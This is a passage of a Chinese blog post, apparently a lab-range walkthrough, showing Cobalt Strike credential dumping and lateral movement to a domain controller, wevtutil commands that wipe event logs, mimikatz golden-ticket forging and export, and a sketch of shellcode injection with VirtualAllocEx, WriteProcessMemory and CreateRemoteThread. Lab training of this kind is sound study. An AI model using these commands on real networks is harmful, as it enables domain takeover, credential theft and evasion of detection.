+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.33.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>扫了有一定时间，发现都开了445端口。那估计有点东西，我们搜索一下，发现是smb服务，我们直接用CS来接着打，先创建一下smb的监听。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.34.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>保存一下，然后直接去抓明文密码。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.35.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后就可以抓到明文密码了，这里不需要去记，CS会帮你记住。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.36.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>我们就可以用CS的功能直接横向移动了。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.37.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>可以看到这里已经记录了我们要的目标。然后我们直接选择一下，右键直接横向移动就行。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.38.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>选择一下监听器和会话，监听器是刚刚的smb监听，会话是我们的web服务器会话。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.39.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后就可以去等待域控上线了。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.40.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>另一台机器也是一样的上线就行了。记得清除痕迹。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell wevtutil cl security    //清理安全日志
+</span></span><span class="line"><span class="cl">shell wevtutil cl system        //清理系统日志
+</span></span><span class="line"><span class="cl">shell wevtutil cl application        //清理应用程序日志
+</span></span><span class="line"><span class="cl">shell wevtutil cl &#34;windows powershell&#34;    //清除power shell日志
+</span></span><span class="line"><span class="cl">shell wevtutil cl Setup     //清除（cl）事件日志中的 &#34;Setup&#34; 事件。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.41.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，拿下域环境。但是还有一个后续没打完，这里我们没清除痕迹，靶场后续再清吧，我们先生成一下黄金票据。</p>
+<h1 id="黄金票据">黄金票据
+</h1><p>我们首先先来获取一下需要的东西，大体上就是需要用户名，域名，SID，哈希值。
+我们接下来一个一个查。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.42.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>用户名：Adminstrator。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.43.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>域名：god.org。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.44.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>SID：s-1-5-10。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.45.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>哈希值这里不用复制，CS会自己提取出来。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.46.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>在刚刚的提取哈希值的同一目录下，有一个黄金票据，直接点开，然后将设置输入进去，我们就可以去生成黄金票据了。然后我们用<code>run klist</code>验证一下。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.47.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>可以看到已经生成好了，没什么毛病啊。然后我们就生成下来，再下载下来就OK了。这里随便cd到了C目录。然后打命令。<code>mimikatz kerberos::list /export</code>
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.48.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，生成好了。
+我们可以检查一下。<code>shell dir C:\*.kirbi</code>，确定有没有，有了之后就可以去下载票据了。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.49.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，直接打CS的命令就可以下载。<code>download 文件名</code> ，会下载到kali上面的Server的downloads文件夹下。我们复制一下就行。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.50.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>OK，完事。</p>
+<h1 id="知识点解析">知识点解析
+</h1><h2 id="黄金票据-1">黄金票据
+</h2><p>打了这么多命令，但是其实不是很清楚黄金票据是什么东西，简单来说就是一个永久的身份信息，当年控制了别的内网主机，或者说之前那个断掉了，你用一台新的内网主机，还是可以通过这个票据，登录成域控</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cobol" data-lang="cobol"><span class="line"><span class="cl"><span class="c">mimika</span><span class="nv">tz</span> <span class="nv">kerberos</span><span class="p">::</span><span class="nv">ptt</span> <span class="mi">0</span><span class="o">-</span><span class="mi">40</span><span class="nv">e00000-Adminstrator</span><span class="err">@</span><span class="nv">krbtgt</span><span class="err">~</span><span class="nv">god</span><span class="p">.</span><span class="nv">org-god</span><span class="p">.</span><span class="nv">org</span><span class="p">.</span><span class="nv">kirbi</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="哈希码横向移动">哈希码横向移动
+</h2><p>前面我们是使用了一个方式直接去抓到明文密码的，但是原理没有介绍，这里介绍一下。
+实际上就是运用了哈希码横向移动，是什么意思呢。其实是一个残留。简单来说就是域控登录过我们当前的这台机子，有一个残留的登录凭证，通过这个登录凭证，我们可以直接登录到域控里面，上传木马，然后拿到域控服务器，进而控制的整个域。下面是一个流程图。
+<img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.51.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>这就是CS的获取密码到上线后门的一个操作过程。</p>
+<h2 id="inject操作">inject操作
+</h2><p>还记得我们前面做权限维持的时候，我们通过inject操作去对一个exe文件注入了木马，但是具体操作是怎么样的，我们探究一下。
+具体流程其实是开辟内存去注入木马进去的，我们来看看流程。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">+-------------------+
+</span></span><span class="line"><span class="cl">| 正常代码 (exe)    |
+</span></span><span class="line"><span class="cl">| 正常数据          |
+</span></span><span class="line"><span class="cl">| 正常堆/栈         |
+</span></span><span class="line"><span class="cl">+-------------------+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个是正常情况下的exe进程。我们使用OpenProcess 打开目标进程，获得读写权限，然后使用VirtualAllocEx 在目标进程开辟内存。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">LPVOID pRemoteMem = VirtualAllocEx(
+</span></span><span class="line"><span class="cl">    hProcess,      // 目标进程
+</span></span><span class="line"><span class="cl">    NULL,          // 系统自动分配地址
+</span></span><span class="line"><span class="cl">    大小,          // ShellCode 长度
+</span></span><span class="line"><span class="cl">    MEM_COMMIT | MEM_RESERVE,  // 提交内存
+</span></span><span class="line"><span class="cl">    PAGE_EXECUTE_READWRITE      // 权限：可读、可写、可执行
+</span></span><span class="line"><span class="cl">);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后我们的内存空间就会变化为下面这样。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+-------------------+
+</span></span><span class="line"><span class="cl">| 正常代码          |
+</span></span><span class="line"><span class="cl">| 正常数据          |
+</span></span><span class="line"><span class="cl">|                   |
+</span></span><span class="line"><span class="cl">| 【新开辟的内存页】 ← 这是给木马准备的
+</span></span><span class="line"><span class="cl">| 权限：RWX          ← 关键！可写可执行
+</span></span><span class="line"><span class="cl">+-------------------+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后我们现在就使用WriteProcessMemory 把木马写入内存。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">WriteProcessMemory(
+</span></span><span class="line"><span class="cl">    hProcess,
+</span></span><span class="line"><span class="cl">    pRemoteMem,    // 目标内存地址
+</span></span><span class="line"><span class="cl">    ShellCode,     // 木马数据
+</span></span><span class="line"><span class="cl">    长度,
+</span></span><span class="line"><span class="cl">    NULL
+</span></span><span class="line"><span class="cl">);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就变成这样。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+-------------------+
+</span></span><span class="line"><span class="cl">| 正常代码
+</span></span><span class="line"><span class="cl">| 正常数据
+</span></span><span class="line"><span class="cl">|
+</span></span><span class="line"><span class="cl">| 【木马 ShellCode】 ← 已经写进去了！
+</span></span><span class="line"><span class="cl">| （二进制机器码）
+</span></span><span class="line"><span class="cl">+-------------------+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后我们还要控制一下进程。使用CreateRemoteThread 让木马在内存里执行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CreateRemoteThread(
+</span></span><span class="line"><span class="cl">    hProcess,
+</span></span><span class="line"><span class="cl">    NULL,
+</span></span><span class="line"><span class="cl">    0,
+</span></span><span class="line"><span class="cl">    (LPTHREAD_START_ROUTINE)pRemoteMem, // 入口 = 木马地址
+</span></span><span class="line"><span class="cl">    NULL,
+</span></span><span class="line"><span class="cl">    0,
+</span></span><span class="line"><span class="cl">    NULL
+</span></span><span class="line"><span class="cl">);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终的内存状态。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+---------------------+
+</span></span><span class="line"><span class="cl">| 正常 exe 代码
+</span></span><span class="line"><span class="cl">| 正常数据
+</span></span><span class="line"><span class="cl">|
+</span></span><span class="line"><span class="cl">| 【木马正在运行中】 ← 独立线程
+</span></span><span class="line"><span class="cl">| 与 exe 并行执行
+</span></span><span class="line"><span class="cl">+---------------------+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就成功注入了，再底层的就是一些二进制数据了，暂时不用了解那么多。</p>
+<p>借鉴链接：https://blog.csdn.net/mc11451419198/article/details/150070176</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%81%B6%E6%84%8Fso%E5%8A%A0%E8%BD%BD%E8%8A%B1%E6%B4%BB/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/CTF/so/so1.png" loading="lazy" data-key="" data-hash="/images/CTF/so/so1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">恶意so加载(花活)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/serialize/serialize1.png" loading="lazy" data-key="" data-hash="/images/TOP10/serialize/serialize1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP反序列化整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/rce%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/RCE/rce1.png" loading="lazy" data-key="" data-hash="/images/TOP10/RCE/rce1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RCE整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ssti%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/SSTI/ssti1.png" loading="lazy" data-key="" data-hash="/images/TOP10/SSTI/ssti1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SSTI整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/sql%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/SQL/sql1.png" loading="lazy" data-key="" data-hash="/images/TOP10/SQL/sql1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 xxxx
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.33.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+    
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
